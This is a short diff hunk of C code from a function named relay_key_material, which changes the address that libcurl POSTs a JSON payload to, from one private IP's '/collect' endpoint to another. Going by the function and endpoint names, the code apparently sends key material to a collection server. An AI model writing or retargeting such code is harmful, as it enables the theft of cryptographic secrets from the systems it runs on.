@@ -869,7 +869,7 @@ int relay_key_material(void)
     }
 
     /* Set URL */
-    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.191:8080/collect");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.15.12:8080/collect");
 
     /* Set HTTP method to POST and provide the payload */
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
